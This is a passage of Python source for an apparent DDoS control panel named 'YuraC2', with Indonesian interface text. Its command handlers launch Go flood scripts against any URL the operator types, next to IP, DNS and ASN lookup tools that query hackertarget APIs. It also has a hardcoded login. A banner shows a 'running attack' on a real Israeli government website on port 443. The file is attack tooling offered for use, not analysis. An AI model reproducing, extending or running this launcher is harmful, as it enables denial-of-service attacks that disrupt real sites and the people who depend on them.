                print('Usage: http-strong <url> METHODS<GET/POST>')
                print('Example: http-strong http://example.com GET')
                   
        elif "ZX" in cnc:
            try:
                url = cnc.split()[1]
                port = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run QWERTY.go -site {url} -data {method}')
            except IndexError:
                print('Usage: ZX <url> <port> METHODS<GET/POST> <time>')
                print('Example: ZX http://example.com 443 GET 60') 
                
        elif "KILLC2" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run KILLERc2.go -site {url} -data {method}')
            except IndexError:
                print('Usage: KILLC2 <url> METHODS<GET/POST>')
                print('Example: KILLC2 http://example.com GET')       
          
        elif "HTTPS-SPAM" in cnc:
            try:
                url = cnc.split()[1]
                port = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run POWER.go -site {url} -data {method}')
            except IndexError:
                print('Usage: HTTPS-SPAM <url> <port> METHODS<GET/POST> <time>')
                print('Example: HTTPS-SPAM http://example.com 443 GET 60')       
# TOOLS
        elif "geoip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: geoip <ip>')
                print('Example: geoip 1.1.1.1')

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')

        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS15169')
                          
        elif "dns-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: dns-lookup <dns>')
                print('Example: dns-lookup google.com')

        elif "reverse-dns" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')                

        elif "cloudflare-lag" in cnc:
            print('Method "CLOUDFLARE-LAG" not enabled')

        elif "help" in cnc:
            print(f'''
LAYER7  ► MENAMPILKAN METHODE LAYER7
LAYER4  ► MENAMPILKAN METHODE LAYER4
PORTS   ► MENAMPILKAN SEMUA PORT
TOOLS   ► MENAMPILKAN TOOLS
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found Bemroo !")
            except IndexError:
                pass

def ongoing():
    clear()
    print(f'''
\x1b[38;2;0;2555mType \u001b[35m"home"\x1b[38;2;0;2555m To Return

[40;38;2;255;0;255m                             ▄· ▄▌▄• ▄▌▄▄▄   ▄▄▄·    ▐ ▄ ▄▄▄ .▄▄▄▄▄
[40;38;2;255;0;255m                           ▐█▪██▌█▪██▌▀▄ █·▐█ ▀█   •█▌▐█▀▄.▀·•██
[40;38;2;255;0;255m                           ▐█▌▐█▪█▌▐█▌▐▀▀▄ ▄█▀▀█   ▐█▐▐▌▐▀▀▪▄ ▐█.▪
[40;38;2;255;0;255m                           ▐█▀·.▐█▄█▌▐█•█▌▐█ ▪▐▌  ██▐█▌▐█▄▄▌ ▐█▌·
[40;38;2;255;0;255m                             ▀ •  ▀▀▀ .▀  ▀ ▀  ▀   ▀▀ █▪ ▀▀▀  ▀▀▀  
                  [40;38;2;0;255;255m╔[40;38;2;6;249;255m═[40;38;2;11;244;255m═[40;38;2;17;238;255m═[40;38;2;22;233;255m═[40;38;2;28;227;255m═[40;38;2;33;222;255m═[40;38;2;39;216;255m═[40;38;2;44;211;255m═[40;38;2;50;205;255m═[40;38;2;55;200;255m═[40;38;2;61;194;255m═[40;38;2;67;188;255m═[40;38;2;72;183;255m═[40;38;2;78;177;255m═[40;38;2;83;172;255m═[40;38;2;89;166;255m═[40;38;2;94;161;255m═[40;38;2;100;155;255m═[40;38;2;105;150;255m═[40;38;2;111;144;255m═[40;38;2;116;139;255m═[40;38;2;122;133;255m═[40;38;2;128;128;255m═[40;38;2;133;122;255m═[40;38;2;139;116;255m═[40;38;2;144;111;255m═[40;38;2;150;105;255m═[40;38;2;155;100;255m═[40;38;2;161;94;255m═[40;38;2;166;89;255m═[40;38;2;172;83;255m═[40;38;2;177;78;255m═[40;38;2;183;72;255m═[40;38;2;188;67;255m═[40;38;2;194;61;255m═[40;38;2;200;55;255m═[40;38;2;205;50;255m═[40;38;2;211;44;255m═[40;38;2;216;39;255m═[40;38;2;222;33;255m═[40;38;2;227;28;255m═[40;38;2;233;22;255m═[40;38;2;238;17;255m═[40;38;2;244;11;255m═[40;38;2;249;6;255m═[40;38;2;255;0;255m╗
                       🚀 \x1b[38;2;0;2555mYour Running Attack To Your Target 🚀
                    Target:     [https://www.gov.il/]
                    Port:       [443]
                    Duration:   [300]
                    Method:     [ZX]
                    Total:      [50000]
                    Sent By:    [root]
                    Date Sent:  [ags/8/2023]
                  [40;38;2;0;255;255m╚[40;38;2;6;249;255m═[40;38;2;11;244;255m═[40;38;2;17;238;255m═[40;38;2;22;233;255m═[40;38;2;28;227;255m═[40;38;2;33;222;255m═[40;38;2;39;216;255m═[40;38;2;44;211;255m═[40;38;2;50;205;255m═[40;38;2;55;200;255m═[40;38;2;61;194;255m═[40;38;2;67;188;255m═[40;38;2;72;183;255m═[40;38;2;78;177;255m═[40;38;2;83;172;255m═[40;38;2;89;166;255m═[40;38;2;94;161;255m═[40;38;2;100;155;255m═[40;38;2;105;150;255m═[40;38;2;111;144;255m═[40;38;2;116;139;255m═[40;38;2;122;133;255m═[40;38;2;128;128;255m═[40;38;2;133;122;255m═[40;38;2;139;116;255m═[40;38;2;144;111;255m═[40;38;2;150;105;255m═[40;38;2;155;100;255m═[40;38;2;161;94;255m═[40;38;2;166;89;255m═[40;38;2;172;83;255m═[40;38;2;177;78;255m═[40;38;2;183;72;255m═[40;38;2;188;67;255m═[40;38;2;194;61;255m═[40;38;2;200;55;255m═[40;38;2;205;50;255m═[40;38;2;211;44;255m═[40;38;2;216;39;255m═[40;38;2;222;33;255m═[40;38;2;227;28;255m═[40;38;2;233;22;255m═[40;38;2;238;17;255m═[40;38;2;244;11;255m═[40;38;2;249;6;255m═[40;38;2;255;0;255m╝
            ''')

    
def login():
    clear()
    user = "YuraC2"
    passwd = "Yura"
    print("🔥Welcome Broh To YuraC2 🔥")
    print("------------------------------------------------------")
    print("🔥Sedang Mengecek Apakah Anda Aman🔥")
    print("[Tunggu 10 Detik]")
    print("")
    time.sleep(3)
    clear()
    time.sleep(1)
    print("🔥Loading 10/100🔥")
    time.sleep(1)
    print("🔥Loading 20/100🔥")
    time.sleep(1)
    print("🔥Loading 30/100🔥")
    time.sleep(1)
    print("🔥Loading 50/100🔥")
    time.sleep(1)
    print("🔥Loading 80/100🔥")
    time.sleep(1)
    print("🔥Loading 100/100🔥")
    time.sleep(1)
    clear()
    
    print("Silahkan Login Broh🙏")
    username = input("⚡ Username: ")
    password = getpass.getpass(prompt='⚡ Password: ')
    if username != user or password != passwd:
        print("")
        print("⚡ PROSES...... ")
        time.sleep(2)
        print("⚡ LOGIN GAGAL SILAHKAN MINTA AKSES KE @fengzzt ")
        sys.exit(1)
    elif username == user and password == passwd:
        print("⚡ Welcome Bro To Yura C2")
        print("⚡ Sedang Loading Tunggu Sebentar...")
        time.sleep(2)
        main() 

login()
